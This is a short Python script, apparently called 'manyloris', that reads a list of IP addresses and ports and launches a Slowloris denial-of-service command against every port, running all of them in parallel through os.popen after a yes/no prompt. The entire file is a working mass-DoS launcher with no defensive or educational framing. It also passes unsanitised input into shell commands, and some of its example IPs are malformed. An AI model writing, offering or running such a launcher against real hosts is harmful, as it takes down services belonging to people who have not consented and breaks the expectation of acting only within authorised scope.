import os
import sys
import time


cmds = []


def build_cmd(target_list):
	for t in target_list:
		aux = t.split(':')
		ports = aux[1:]
		ip = aux[0]
		for p in ports:
			cmd = 'slowloris ' + ip + ' -s 1300' + ' -p ' + p
			cmds.append(cmd)
			print(cmd)


def main() -> int:

	# check that the required arguments number was fulfilled
	if len(sys.argv) != 2:
		print('\nYou need to provide a list of targets.\n\n====Example list====\n123.423.1.1:80:443\n12.1.612.123:80:443:8443\n231.23.522.3:443:80\n141.101.123.30:443\n\n-> Note that the list must have a target per line and the ports seperated by ":".\n\n====Usage====\n\npython3 manyloris [PATH TO LIST]\n\ne.g. python3 manyloris ~/Documents/targets.txt')
		return 0


	with open(sys.argv[1]) as file:
		targets = file.readlines()

	# build the commands for each target
	build_cmd(targets)

	start = input('\n\nWARNING! The Slowloris commands listed above are going to be executed.\nAre you sure that you want to proceed with %s targets? (Y/n)\n' % (len(targets)))

	if start.lower() in ['n', 'no']: 
		return 0

	time.sleep(2)

    # executing the commands
	for cmd in cmds:
		os.popen(cmd)
	
	return 0


if __name__ == '__main__':
    main()
